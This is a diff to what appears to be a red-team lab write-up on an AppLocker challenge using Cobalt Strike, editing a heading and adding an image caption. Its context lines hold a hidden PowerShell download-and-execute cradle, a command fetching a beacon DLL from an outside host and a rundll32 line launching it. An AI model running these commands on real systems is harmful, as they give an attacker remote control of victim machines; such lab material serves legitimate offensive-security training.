@@ -269,7 +269,7 @@ Click Launch.
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.0.10:80/a'))"
 ```
 
-## Generate Stageless Beacon DLL (Attacker Desktop — CS)
+## Generate Stageless Beacon DLL  
 
 ```
 Cobalt Strike > Payloads > Windows Stageless Payload
@@ -334,7 +334,9 @@ Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\
 rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```
 
-<img src="/images/applocker-challenge02.png" width=860>
+>Initial Beacon connect to cobalt strike  
+
+<img src="/images/applocker-challenge02.png" width=860>  
 
 ---
 
